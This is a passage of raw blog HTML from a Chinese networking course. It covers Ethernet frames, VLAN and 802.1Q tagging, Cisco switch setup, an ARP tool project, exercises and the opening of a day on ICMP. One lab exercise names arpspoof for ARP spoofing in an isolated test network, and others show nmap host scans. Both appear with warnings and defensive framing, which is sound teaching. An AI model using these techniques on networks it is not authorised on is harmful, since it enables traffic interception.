PPPoE发现<br>PPPoE协议<br><br><span class="hljs-number">0x8864</span> - PPPoE会话<br>PPPoE数据<br><br>示例：<span class="hljs-built_in">IP</span>数据包的以太网帧<br><br>┌────────────────────────────────────────┐<br>│ 目标MAC: aa:bb:cc:<span class="hljs-built_in">dd</span>:ee:ff             │<br>│ 源MAC: <span class="hljs-number">11</span>:<span class="hljs-number">22</span>:<span class="hljs-number">33</span>:<span class="hljs-number">44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">66</span>               │<br>│ 类型: <span class="hljs-number">0x0800</span> (IPv4)                    │<br>├────────────────────────────────────────┤<br>│ <span class="hljs-built_in">IP</span>头部（<span class="hljs-number">20</span>字节）                       │<br>│ TCP头部（<span class="hljs-number">20</span>字节）                      │<br>│ HTTP数据（变长）                       │<br>├────────────────────────────────────────┤<br>│ FCS: xx:xx:xx:xx                       │<br>└────────────────────────────────────────┘<br></code></pre></td></tr></table></figure><h3 id="6-3-VLAN基础"><a href="#6-3-VLAN基础" class="headerlink" title="6.3 VLAN基础"></a>6.3 VLAN基础</h3><p><strong>什么是VLAN？</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">VLAN</span> <span class="hljs-operator">=</span> Virtual Local Area Network<br>虚拟局域网<br><br>作用：<br>- 在物理网络上划分逻辑网络<br>- 隔离广播域<br>- 提高安全性<br>- 简化管理<br><br>传统网络 vs VLAN：<br><br>传统（一个交换机 <span class="hljs-operator">=</span> 一个广播域）：<br>┌────────────────────────────────────┐<br>│         交换机                     │<br>├────┬────┬────┬────┬────┬────┬─────┤<br>│ PC1│ PC2│ PC3│ PC4│ PC5│ PC6│ PC7 │<br>└────┴────┴────┴────┴────┴────┴─────┘<br>所有PC在同一广播域，能互相通信<br><br>VLAN（一个交换机 <span class="hljs-operator">=</span> 多个虚拟交换机）：<br>┌────────────────────────────────────┐<br>│         物理交换机                 │<br>├─────────────────┬──────────────────┤<br>│   VLAN <span class="hljs-number">10</span>       │    VLAN <span class="hljs-number">20</span>       │<br>│  (研发部)       │    (销售部)      │<br>├────┬────┬───────┼────┬────┬────────┤<br>│ PC1│ PC2│ PC3   │ PC4│ PC5│ PC6    │<br>└────┴────┴───────┴────┴────┴────────┘<br>不同VLAN隔离，不能直接通信<br><br>优点：<br>✅ 隔离广播<br>✅ 提高安全<br>✅ 灵活管理<br>✅ 逻辑分组<br>✅ 跨地域VLAN<br></code></pre></td></tr></table></figure><p><strong>802.1Q VLAN标签</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">802.1Q标准：<br>在以太网帧中插入4字节VLAN标签<br><br>标准以太网帧：<br>┌─────────┬─────────┬──────┬─────────┬─────┐<br>│ 目标MAC │ 源MAC   │ 类型 │  数据   │ FCS │<br>└─────────┴─────────┴──────┴─────────┴─────┘<br><br>802.1Q标记帧：<br>┌─────────┬─────────┬──────────┬──────┬─────────┬─────┐<br>│ 目标MAC │ 源MAC   │VLAN标签  │ 类型 │  数据   │ FCS │<br>│ 6字节   │ 6字节   │ 4字节    │2字节 │ 46-1500 │4字节│<br>└─────────┴─────────┴──────────┴──────┴─────────┴─────┘<br><br>VLAN标签（4字节）：<br>┌────────────────┬─────┬─────┬────────────────┐<br>│   TPID         │ PCP │ DEI │    VID         │<br>│   16位         │ 3位 │ 1位 │    12位        │<br>└────────────────┴─────┴─────┴────────────────┘<br><br>TPID（Tag Protocol Identifier）：<br><span class="hljs-bullet">- </span>固定值：0x8100<br><span class="hljs-bullet">- </span>标识这是VLAN标记帧<br><br>PCP（Priority Code Point）：<br><span class="hljs-bullet">- </span>3位，0-7<br><span class="hljs-bullet">- </span>服务质量（QoS）优先级<br><br>DEI（Drop Eligible Indicator）：<br><span class="hljs-bullet">- </span>1位<br><span class="hljs-bullet">- </span>标记是否可丢弃<br><br>VID（VLAN Identifier）：<br><span class="hljs-bullet">- </span>12位，0-4095<br><span class="hljs-bullet">- </span>VLAN ID<br><span class="hljs-bullet">- </span>0：默认VLAN<br><span class="hljs-bullet">- </span>1：默认VLAN（通常）<br><span class="hljs-bullet">- </span>4095：保留<br><span class="hljs-bullet">- </span>有效范围：1-4094<br><br>示例：<br>VLAN ID = 10<br>标签：81 00 00 0A<br></code></pre></td></tr></table></figure><p><strong>VLAN配置示例</strong>：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs sqf">Cisco交换机配置：<br><br><span class="hljs-number">1</span>. 创建VLAN<br><span class="hljs-keyword">Switch</span>(config)<span class="hljs-meta"># vlan 10</span><br><span class="hljs-keyword">Switch</span>(config-vlan)<span class="hljs-meta"># name VLAN_DEV</span><br><span class="hljs-keyword">Switch</span>(config-vlan)<span class="hljs-meta"># exit</span><br><br><span class="hljs-keyword">Switch</span>(config)<span class="hljs-meta"># vlan 20</span><br><span class="hljs-keyword">Switch</span>(config-vlan)<span class="hljs-meta"># name VLAN_SALES</span><br><span class="hljs-keyword">Switch</span>(config-vlan)<span class="hljs-meta"># exit</span><br><br><span class="hljs-number">2</span>. 分配端口到VLAN<br><span class="hljs-keyword">Switch</span>(config)<span class="hljs-meta"># interface GigabitEthernet0/1</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># switchport mode access</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># switchport access vlan 10</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># exit</span><br><br><span class="hljs-keyword">Switch</span>(config)<span class="hljs-meta"># interface GigabitEthernet0/2</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># switchport mode access</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># switchport access vlan 20</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># exit</span><br><br><span class="hljs-number">3</span>. 配置Trunk端口（连接交换机）<br><span class="hljs-keyword">Switch</span>(config)<span class="hljs-meta"># interface GigabitEthernet0/24</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># switchport mode trunk</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># switchport trunk allowed vlan 10,20</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># exit</span><br><br><span class="hljs-number">4</span>. 查看VLAN<br><span class="hljs-keyword">Switch</span><span class="hljs-meta"># show vlan brief</span><br><br>VLAN <span class="hljs-built_in">Name</span>                             Status    Ports<br>---- -------------------------------- --------- -------------------------------<br><span class="hljs-number">1</span>    <span class="hljs-keyword">default</span>                          active    Gi0/<span class="hljs-number">3</span>, Gi0/<span class="hljs-number">4</span><br><span class="hljs-number">10</span>   VLAN_DEV                         active    Gi0/<span class="hljs-number">1</span><br><span class="hljs-number">20</span>   VLAN_SALES                       active    Gi0/<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><hr><h2 id="7-实战项目：ARP工具套件"><a href="#7-实战项目：ARP工具套件" class="headerlink" title="7. 实战项目：ARP工具套件"></a>7. 实战项目：ARP工具套件</h2><h3 id="7-1-项目需求"><a href="#7-1-项目需求" class="headerlink" title="7.1 项目需求"></a>7.1 项目需求</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown">功能需求：<br><span class="hljs-bullet">1.</span> ARP缓存查看和管理<br><span class="hljs-bullet">   -</span> 显示ARP表<br><span class="hljs-bullet">   -</span> 添加/删除条目<br><span class="hljs-bullet">   -</span> 清空缓存<br><br><span class="hljs-bullet">2.</span> ARP扫描<br><span class="hljs-bullet">   -</span> 扫描局域网主机<br><span class="hljs-bullet">   -</span> 发现活动主机<br><span class="hljs-bullet">   -</span> MAC地址识别<br><br><span class="hljs-bullet">3.</span> ARP监控<br><span class="hljs-bullet">   -</span> 实时监控ARP流量<br><span class="hljs-bullet">   -</span> 检测ARP变化<br><span class="hljs-bullet">   -</span> 警告异常<br><br><span class="hljs-bullet">4.</span> ARP安全检测<br><span class="hljs-bullet">   -</span> 检测ARP欺骗<br><span class="hljs-bullet">   -</span> IP/MAC冲突检测<br><span class="hljs-bullet">   -</span> 网关验证<br><br>技术要求：<br><span class="hljs-bullet">-</span> Python实现<br><span class="hljs-bullet">-</span> 原始套接字<br><span class="hljs-bullet">-</span> 友好的输出<br><span class="hljs-bullet">-</span> 跨平台支持<br></code></pre></td></tr></table></figure><h3 id="7-2-工具演示"><a href="#7-2-工具演示" class="headerlink" title="7.2 工具演示"></a>7.2 工具演示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ARP缓存查看</span><br>python day25_arp_tool.py --show<br><br><span class="hljs-comment"># ARP扫描</span><br><span class="hljs-built_in">sudo</span> python day25_arp_tool.py --scan 192.168.1.0/24<br><br><span class="hljs-comment"># ARP监控</span><br><span class="hljs-built_in">sudo</span> python day25_arp_tool.py --monitor<br><br><span class="hljs-comment"># 安全检测</span><br><span class="hljs-built_in">sudo</span> python day25_arp_tool.py --detect<br></code></pre></td></tr></table></figure><hr><h2 id="8-今日练习"><a href="#8-今日练习" class="headerlink" title="8. 今日练习"></a>8. 今日练习</h2><h3 id="练习1：ARP分析"><a href="#练习1：ARP分析" class="headerlink" title="练习1：ARP分析"></a>练习1：ARP分析</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 查看本机ARP缓存：<br>   arp -a<br><br>   分析：<br><span class="hljs-bullet">   -</span> 有多少条目？<br><span class="hljs-bullet">   -</span> 哪些是动态的？<br><span class="hljs-bullet">   -</span> 网关MAC是什么？<br><br><span class="hljs-bullet">2.</span> 清空ARP缓存后ping网关：<br>   sudo ip neigh flush all<br>   ping -c 1 192.168.1.1<br>   arp -a<br><br>   观察ARP表的变化<br><br><span class="hljs-bullet">3.</span> 使用tcpdump抓取ARP包：<br>   sudo tcpdump -i eth0 arp -vv<br><br>   分析ARP请求和应答<br></code></pre></td></tr></table></figure><h3 id="练习2：ARP实验"><a href="#练习2：ARP实验" class="headerlink" title="练习2：ARP实验"></a>练习2：ARP实验</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown">实验1：ARP缓存超时<br><span class="hljs-bullet">1.</span> 记录一个动态ARP条目<br><span class="hljs-bullet">2.</span> 等待一段时间<br><span class="hljs-bullet">3.</span> 观察条目是否消失<br><span class="hljs-bullet">4.</span> 再次ping，观察ARP请求<br><br>实验2：静态ARP<br><span class="hljs-bullet">1.</span> 添加静态ARP：<br>   sudo arp -s <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span></span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">MAC</span>&gt;</span></span><br><span class="hljs-bullet">2.</span> 尝试ping<br><span class="hljs-bullet">3.</span> 删除静态ARP<br><span class="hljs-bullet">4.</span> 对比差异<br><br>实验3：ARP扫描<br>使用nmap扫描局域网：<br>nmap -sn 192.168.1.0/24<br>观察发现的主机<br></code></pre></td></tr></table></figure><h3 id="练习3：安全测试"><a href="#练习3：安全测试" class="headerlink" title="练习3：安全测试"></a>练习3：安全测试</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs markdown">在隔离的测试环境中：<br><br><span class="hljs-bullet">1.</span> 搭建测试网络<br><span class="hljs-bullet">   -</span> 2-3台虚拟机<br><span class="hljs-bullet">   -</span> 同一网络<br><br><span class="hljs-bullet">2.</span> 测试ARP欺骗（仅用于学习）<br><span class="hljs-bullet">   -</span> 使用arpspoof<br><span class="hljs-bullet">   -</span> 观察流量<br><span class="hljs-bullet">   -</span> 验证防御措施<br><br><span class="hljs-bullet">3.</span> 部署防御<br><span class="hljs-bullet">   -</span> 配置静态ARP<br><span class="hljs-bullet">   -</span> 使用监控工具<br><span class="hljs-bullet">   -</span> 测试效果<br><br>注意：<br>⚠️ 仅在自己的测试环境中进行<br>⚠️ 不要在生产网络测试<br>⚠️ ARP欺骗是违法行为<br></code></pre></td></tr></table></figure><hr><h2 id="9-常见问题"><a href="#9-常见问题" class="headerlink" title="9. 常见问题"></a>9. 常见问题</h2><p><strong>Q1：为什么ARP使用广播？</strong></p><p>A：</p><ul><li>ARP在数据链路层工作</li><li>不知道目标MAC地址</li><li>只能使用广播让所有主机收到</li><li>目标主机识别出是自己的IP后响应</li></ul><p><strong>Q2：ARP缓存为什么会超时？</strong></p><p>A：</p><ul><li>主机可能更换网卡（MAC变化）</li><li>IP地址可能重新分配</li><li>避免缓存过期信息</li><li>典型超时：2-20分钟</li></ul><p><strong>Q3：如何防止ARP攻击？</strong></p><p>A：<br>最佳方案组合：</p><ol><li>交换机启用DAI和DHCP Snooping</li><li>关键服务器使用静态ARP</li><li>使用HTTPS等加密协议</li><li>部署ARP监控工具</li><li>VLAN隔离</li></ol><p><strong>Q4：跨路由器能ARP吗？</strong></p><p>A：</p><ul><li>不能！ARP只在局域网内工作</li><li>路由器不转发ARP广播</li><li>跨网段通信需要路由</li><li>路由器会代理ARP（如果启用）</li></ul><p><strong>Q5：IPv6还用ARP吗？</strong></p><p>A：</p><ul><li>不用ARP</li><li>使用NDP（邻居发现协议）</li><li>基于ICMPv6</li><li>功能更强大</li></ul><hr><h2 id="10-总结"><a href="#10-总结" class="headerlink" title="10. 总结"></a>10. 总结</h2><p>今天我们学习了：</p><h3 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h3><ol><li><p><strong>ARP协议</strong>：</p><ul><li>IP地址 → MAC地址映射</li><li>广播请求 + 单播应答</li><li>ARP缓存提高效率</li></ul></li><li><p><strong>ARP工作流程</strong>：</p><ul><li>查询ARP缓存</li><li>发送ARP请求（广播）</li><li>接收ARP应答（单播）</li><li>更新缓存</li><li>发送数据</li></ul></li><li><p><strong>ARP报文格式</strong>：</p><ul><li>28字节固定格式</li><li>包含硬件和协议地址</li><li>操作字段区分请求&#x2F;应答</li></ul></li><li><p><strong>免费ARP和代理ARP</strong>：</p><ul><li>免费ARP：检测冲突、更新缓存</li><li>代理ARP：路由器代理响应</li></ul></li><li><p><strong>ARP安全</strong>：</p><ul><li>ARP欺骗&#x2F;缓存投毒</li><li>中间人攻击</li><li>防御措施：DAI、静态ARP、监控</li></ul></li><li><p><strong>MAC地址</strong>：</p><ul><li>48位物理地址</li><li>OUI + NIC</li><li>单播&#x2F;多播&#x2F;广播</li></ul></li><li><p><strong>以太网帧</strong>：</p><ul><li>目标MAC + 源MAC + 类型 + 数据 + FCS</li><li>最小64字节，最大1518字节</li><li>MTU 1500字节</li></ul></li><li><p><strong>VLAN</strong>：</p><ul><li>虚拟局域网</li><li>隔离广播域</li><li>802.1Q标签</li></ul></li></ol><h3 id="重点回顾"><a href="#重点回顾" class="headerlink" title="重点回顾"></a>重点回顾</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ARP工作流程：<br><span class="hljs-bullet">1.</span> 需要MAC地址<br><span class="hljs-bullet">2.</span> 查ARP缓存 → 有：使用；无：继续<br><span class="hljs-bullet">3.</span> 广播ARP请求<br><span class="hljs-bullet">4.</span> 目标主机单播应答<br><span class="hljs-bullet">5.</span> 更新缓存<br><span class="hljs-bullet">6.</span> 发送数据<br><br>ARP欺骗防御：<br>网络级：DAI + DHCP Snooping<br>主机级：静态ARP + 监控<br>应用级：使用加密协议<br><br>MAC地址结构：<br>OUI（24位）+ NIC（24位）<br>第一字节最低位：单播/多播<br>第一字节第二低位：全球/本地<br></code></pre></td></tr></table></figure><h3 id="安全警示"><a href="#安全警示" class="headerlink" title="安全警示"></a>安全警示</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">⚠️ ARP协议没有认证<br>⚠️ 容易被欺骗和攻击<br>⚠️ 必须部署防御措施<br>⚠️ 使用加密协议保护数据<br>⚠️ 仅在授权环境测试攻击技术<br></code></pre></td></tr></table></figure><h3 id="明天预告"><a href="#明天预告" class="headerlink" title="明天预告"></a>明天预告</h3><p><strong>第26天：路由协议基础</strong></p><p>内容预览：</p><ul><li>路由基础概念</li><li>静态路由配置</li><li>动态路由协议概述</li><li>RIP协议详解</li><li>OSPF基础</li><li>路由表分析</li></ul><hr><p><strong>继续加油！</strong> 🚀</p><p>今天我们深入学习了ARP协议，理解了IP地址到MAC地址的映射过程，以及ARP安全问题和防御措施。这是网络通信的基础，也是网络安全的重要一环。明天我们将学习路由协议，了解数据如何在不同网络间传输！</p><p><strong>进度：25&#x2F;180天（13.9%）</strong></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>24天：ICMP和网络诊断工具</title>
    <link href="/2025/11/10/24%E5%A4%A9%EF%BC%9AICMP%E5%92%8C%E7%BD%91%E7%BB%9C%E8%AF%8A%E6%96%AD%E5%B7%A5%E5%85%B7/"/>
    <url>/2025/11/10/24%E5%A4%A9%EF%BC%9AICMP%E5%92%8C%E7%BD%91%E7%BB%9C%E8%AF%8A%E6%96%AD%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="第24天：ICMP和网络诊断工具"><a href="#第24天：ICMP和网络诊断工具" class="headerlink" title="第24天：ICMP和网络诊断工具"></a>第24天：ICMP和网络诊断工具</h1><h2 id="今日目标"><a href="#今日目标" class="headerlink" title="今日目标"></a>今日目标</h2><ul><li>理解ICMP协议的作用和工作原理</li><li>掌握ICMP报文格式和类型</li><li>学习ICMPv6的特点</li><li>深入理解ping的工作原理</li><li>掌握traceroute的实现机制</li><li>学会使用各种网络诊断工具</li><li>实现自己的ping工具</li></ul><hr><h2 id="1-ICMP协议概述"><a href="#1-ICMP协议概述" class="headerlink" title="1. ICMP协议概述"></a>1. ICMP协议概述</h2><h3 id="1-1-什么是ICMP？"><a href="#1-1-什么是ICMP？" class="headerlink" title="1.1 什么是ICMP？"></a>1.1 什么是ICMP？</h3><p><strong>ICMP &#x3D; Internet Control Message Protocol（互联网控制消息协议）</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ICMP是什么？<br><span class="hljs-bullet">- </span>IP层的辅助协议<br><span class="hljs-bullet">- </span>用于错误报告和网络诊断<br><span class="hljs-bullet">- </span>不传输用户数据<br><span class="hljs-bullet">- </span>承载在IP数据包中<br><br>生活比喻：<br>如果IP是邮政系统，ICMP就是&quot;查询回执&quot;和&quot;退信通知&quot;<br><span class="hljs-bullet">- </span>包裹到了吗？→ ping（回声请求/应答）<br><span class="hljs-bullet">- </span>包裹为什么没到？→ 目标不可达<br><span class="hljs-bullet">- </span>路线是什么？→ traceroute（时间超时）<br><br>特点：<br>✅ 网络层协议（但服务于IP）<br>✅ 错误报告<br>✅ 网络诊断<br>✅ 路径发现<br></code></pre></td></tr></table></figure><p><strong>为什么需要ICMP？</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">IP协议的局限性：<br>❌ IP尽力而为，不保证送达<br>❌ 不提供错误报告<br>❌ 不提供反馈机制<br>❌ 不知道网络状态<br><br>ICMP的作用：<br>✅ 报告传输错误<br>✅ 提供网络诊断<br>✅ 帮助调试网络<br>✅ 发现网络问题<br><br>常见场景：<br><span class="hljs-bullet">- </span>目标主机不可达<br><span class="hljs-bullet">- </span>网络拥塞（源抑制）<br><span class="hljs-bullet">- </span>路由重定向<br><span class="hljs-bullet">- </span>超时<br><span class="hljs-bullet">- </span>参数错误<br></code></pre></td></tr></table></figure><h3 id="1-2-ICMP报文格式"><a href="#1-2-ICMP报文格式" class="headerlink" title="1.2 ICMP报文格式"></a>1.2 ICMP报文格式</h3><p><strong>基本格式</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">所有ICMP报文的前8字节格式相同：<br><br><span class="hljs-code"> 0                   1                   2                   3</span><br><span class="hljs-section"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|     Type      |     Code      |          Checksum             |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|                    Rest of Header (4 bytes)                   |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|                      Data Section                             |<br><span class="hljs-section">|                       (可变长度)                              |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><br>字段说明：<br><br>Type (类型, 8位):<br><span class="hljs-bullet">- </span>标识ICMP消息类型<br><span class="hljs-bullet">- </span>不同类型有不同功能<br><br>Code (代码, 8位):<br><span class="hljs-bullet">- </span>进一步细分类型<br><span class="hljs-bullet">- </span>提供更详细的信息<br><br>Checksum (校验和, 16位):<br><span class="hljs-bullet">- </span>检测报文完整性<br><span class="hljs-bullet">- </span>覆盖整个ICMP报文<br><br>Rest of Header (剩余头部, 32位):<br><span class="hljs-bullet">- </span>根据类型而不同<br><span class="hljs-bullet">- </span>可能包含ID、序列号等<br></code></pre></td></tr></table></figure><h3 id="1-3-ICMP报文类型"><a href="#1-3-ICMP报文类型" class="headerlink" title="1.3 ICMP报文类型"></a>1.3 ICMP报文类型</h3><p><strong>主要类型</strong>：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span 